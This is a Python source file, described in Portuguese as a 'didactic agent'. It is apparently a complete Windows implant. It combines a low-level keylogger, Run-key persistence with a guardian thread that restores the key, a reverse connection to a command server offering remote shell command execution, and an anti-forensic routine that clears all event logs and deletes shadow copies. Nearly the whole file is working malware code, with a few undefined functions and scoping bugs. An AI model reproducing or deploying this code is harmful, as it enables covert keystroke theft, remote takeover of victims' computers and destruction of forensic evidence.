#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Agente didático – demonstra persistência, keylogger e limpeza sem traço
Quando o atacante envia 'MENU' → abre o painel interativo
Quando escolhe '4' ou envia '/wipe' direto → limpeza extrema
"""

from time import sleep
import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil, datetime
from pathlib import Path
from ctypes import windll
from datetime import datetime as dt

# ---------------- CONFIGURAÇÕES ÚNICAS DO CENÁRIO ---------------- #
IP = "192.168.1.80"
PORT = 443                                            # endereço do C&C
LOG_FILE = os.path.join(os.getenv("APPDATA"), "svchost.log")   # onde guarda tudo
MUTEX    = "Global\\msupdate42"                      # singleton -> 1 instância
BUF, LOCK = "", threading.Lock()                     # buffer do keylogger
RETRY_CUR = 1                                         # back-off exponencial
DEBUG     = False                                     # True = beeps/flashs
XOR_KEY   = 0x9F                                      # xor rápido p/ ofuscar

# ----------------------------------------------------------------- #
#  UTILITÁRIOS BÁSICOS
# ----------------------------------------------------------------- #
def _xor(b: str) -> str:
    """XOR simples (não criptográfico) para dificultar 'strings'."""
    return "".join([chr(ord(c)^XOR_KEY) for c in b])

def log(msg: str) -> None:
    """Salva mensagem com timestamp no LOG_FILE (texto claro)."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"[{dt.now():%d/%m %H:%M:%S}] {msg}\n")
    except Exception:
        pass                                # se falhar, segue em frente

# ----------------------------------------------------------------- #
#  KEYLOGGER (WH_KEYBOARD_LL)
# ----------------------------------------------------------------- #
WH_KEYBOARD_LL = 13
WM_KEYDOWN     = 0x0100
WM_SYSKEYDOWN  = 0x0104
HOOKPROCTYPE   = ctypes.WINFUNCTYPE(ctypes.c_uint, ctypes.c_uint,
                                    ctypes.c_uint, ctypes.c_void_p)
hook_id        = None

def low_level_handler(nCode, wParam, lParam):
    """
    Chamada pelo Windows a cada tecla pressionada.
    Converte virtual-key-code → caractere legível → xor → BUF global.
    """
    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        vk = lParam[0] & 0xFF
        mapped = windll.user32.MapVirtualKeyA(vk, 2)
        char = ""
        if 32 <= mapped <= 126:
            char = chr(mapped)
            shift = windll.user32.GetKeyState(0x10) & 0x8000
            caps  = windll.user32.GetKeyState(0x14) & 1
            if shift ^ caps and char.isalpha():
                char = char.upper()
        # especiais
        elif vk == 13: char = "\n"
        elif vk == 9 : char = "\t"
        elif vk == 8 : char = "[BS]"
        elif vk == 27: char = "[ESC]"
        if char:
            with LOCK:
                BUF += _xor(char)
                # impede crescimento infinito: mantém últimas 64 KB
                if len(BUF) > 65536:
                    BUF = BUF[-65536:]
    # encaminha para o próximo hook
    return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def start_keylogger():
    """Instala o hook global de baixo nível (thread separada)."""
    global hook_id
    hook_id = windll.user32.SetWindowsHookExA(
        WH_KEYBOARD_LL, HOOKPROCTYPE(low_level_handler),
        windll.kernel32.GetModuleHandleA(None), 0)
    # loop de mensagens obrigatório para hooks
    msg = ctypes.wintypes.MSG()
    while windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != 0:
        pass

# ----------------------------------------------------------------- #
#  PERSISTÊNCIA (HKCU\Run + copia em APPDATA)
# ----------------------------------------------------------------- #
EXE_PATH = os.path.join(os.getenv("APPDATA"), "msupdate.exe")

def persist():
    """Copia si mesmo para APPDATA e grata chave Run."""
    if not os.path.exists(EXE_PATH):
        shutil.copy2(sys.executable, EXE_PATH)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
        winreg.SetValueEx(k, "msupdate", 0, winreg.REG_SZ, EXE_PATH)

def persist_guardian():
    """Thread que re-cria a chave de registro caso o usuário/admin apague."""
    while True:
        sleep(60)
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
                val, _ = winreg.QueryValueEx(k, "msupdate")
        except:
            val = None
        if val != EXE_PATH:
            persist()
            log("GUARDIAN: chave Run recriada")

# ----------------------------------------------------------------- #
#  LIMPEZA EXTREMA (apaga tudo, sobrescreve clusters, limpa eventos)
# ----------------------------------------------------------------- #
def overwrite_then_unlink(path: str|Path):
    """Preenche arquivo com 0x00 e depois deleta (impede undelete)."""
    p = Path(path)
    if not p.exists(): return
    sz = p.stat().st_size
    try:
        with p.open("r+b") as fh:
            fh.write(b"\x00" * sz)
        p.unlink()
    except Exception:
        pass

def wipe_windows_logs():
    """Apaga logs de aplicativos (.evtx) onde o agente possa ter sido citado."""
    ps='Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { wevtutil cl $_.LogName }'
    subprocess.run(["powershell","-NoProfile","-Command",ps],capture_output=True)

def wipe_volume_shadows():
    """
    Remove restaurações (shadow copies) que possam conter versões antigas do .exe.
    """
    subprocess.run(["vshadow","-da"],shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

def cleanup_hardcore():
    """
    1 – sobrescreve o executável em APPDATA
    2 – sobrescreve arquivo de log
    3 – apaga a chave Run
    4 – limpa event viewer (Windows Logs)
    5 – remove VSS (shadow copies) 
    """
    # 1) binário
    overwrite_then_unlink(EXE_PATH)
    # 2) log
    overwrite_then_unlink(LOG_FILE)
    # 3) chave registro
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_ALL_ACCESS) as k:
            winreg.DeleteValue(k, "msupdate")
    except Exception:
        pass
    # 4) logs do Windows
    wipe_windows_logs()
    # 5) sombra de volume
    wipe_volume_shadows()
    log("LIMPEZA EXTREMA executada – nenhum rasto esperado")

# ----------------------------------------------------------------- #
#  MENU INTERATIVO (enviado via socket)
# ----------------------------------------------------------------- #
def show_menu(s):
    menu="""
 Painel de Controle 
1 Visualizar teclas capturadas (keys)
2 Executar comando CMD
3 Status de persistência
4 LIMPAR TUDO (wipe) /SEM RASTRO/
5 Sair (manter conexão – menu volta)
Escolha (1-5): """
    s.send(menu.encode())

def handle_command(s, cmd: str) -> bool:
    """
    Processa opção do atacante.
    Retorna True = continua conectado, False = desconecta.
    """
    cmd = cmd.strip()
    if cmd == "1":
        with LOCK:
            chunk = BUF[-2048:]  # ÚLTIMAS 2 KB
        s.send(b"--- KEYS (xor 0x%02X) ---\n%s\n--- FIM ---\n" % (XOR_KEY, chunk.encode()))
        return True

    elif cmd == "2":
        s.send(b"CMD> ")
        cmd_line = s.recv(4096).decode().strip()
        if not cmd_line:
            return True
        try:
            out = subprocess.check_output(cmd_line, shell=True, stderr=subprocess.STDOUT, timeout=15)
            s.send(out + b"\n")
        except subprocess.TimeoutExpired:
            s.send(b"TIMEOUT (15 s)\n")
        except Exception as e:
            s.send(f"ERRO: {e}\n".encode())
        return True

    elif cmd == "3":
        info  = "Executavel: " + EXE_PATH + "\n"
        info += "Registry  : HKCU\\Run\\msupdate\n"
        info += "Log local : " + LOG_FILE + "\n"
        info += "PID atual : " + str(os.getpid()) + "\n"
        s.send(info.encode())
        return True

    elif cmd == "4" or cmd == "/wipe":
        s.send(b"[+] Iniciando limpeza extrema...\n")
        cleanup_hardcore()
        s.send("[+] Rastros apagados - desconectando.\n".encode())
        return False  # desliga conexão

    elif cmd == "5" or cmd == "exit":
        s.send("[*] Saindo…\n".encode())
        return False

    else:
        s.send(b"[!] Opcao invalida\n")
        return True

# ----------------------------------------------------------------- #
#  CONEXÃO (TCP simples) + LOOP PRINCIPAL
# ----------------------------------------------------------------- #
def connect_back():
    """Tenta conectar a cada RETRY_CUR segundos (back-off)."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((IP, PORT))
            return s
        except Exception:
            sleep(RETRY_CUR)
            RETRY_CUR = min(RETRY_CUR * 2, 1800)

def main_loop():
    """Loop eterno: conecta -> menu -> processa -> reconecta."""
    while True:
        sock = connect_back()
        log("Conectado ao C&C")
        try:
            while True:
                show_menu(sock)
                data = sock.recv(1024).decode(errors="ignore").strip()
                if not data:
                    break
                if not handle_command(sock, data):
                    break
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            log("Desconectado do C&C – reconectando…")

if __name__ == "__main__":
    # Garante 1 única instância
    mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
    if windll.kernel32.GetLastError() == 0xB7:  # ERROR_ALREADY_EXISTS
        sys.exit()

    # Persistência + keylogger
    persist()
    threading.Thread(target=persist_guardian, daemon=True).start()
    threading.Thread(target=start_keylogger, daemon=True).start()

    # Sinais visuais (opcional)
    if DEBUG:
        threading.Thread(target=lambda: flash_desktop(), daemon=True).start()
        threading.Thread(target=lambda: beep_ok(), daemon=True).start()
        popup_ok()

    # Entra no loop de conexão
    main_loop()
